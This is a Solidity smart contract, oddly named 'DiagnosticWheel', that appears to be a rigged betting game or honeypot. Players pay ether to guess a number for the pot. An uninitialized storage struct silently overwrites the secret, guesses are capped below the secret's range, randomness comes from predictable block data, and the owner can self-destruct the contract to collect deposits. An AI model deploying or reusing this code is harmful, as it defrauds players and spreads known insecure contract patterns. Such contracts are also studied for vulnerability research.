pragma solidity ^0.4.19;


contract DiagnosticWheel {

    uint256 private secretNumber;
    uint256 public finalPlayed;
    uint256 public betServicecost = 0.1 ether;
    address public custodianAddr;

    struct HealthChallenge {
        address participant;
        uint256 number;
    }
    HealthChallenge[] public gamesPlayed;

    function DiagnosticWheel() public {
        custodianAddr = msg.sender;
        shuffle();
    }

    function shuffle() internal {

        secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 20 + 1;
    }

    function participate(uint256 number) payable public {
        require(msg.value >= betServicecost && number <= 10);
        HealthChallenge wellnessProgram;
        wellnessProgram.participant = msg.sender;
        wellnessProgram.number = number;
        gamesPlayed.push(wellnessProgram);

        if (number == secretNumber) {

            msg.sender.transfer(this.balance);
        }

        shuffle();
        finalPlayed = now;
    }

    function deactivateSystem() public {
        if (msg.sender == custodianAddr && now > finalPlayed + 1 days) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}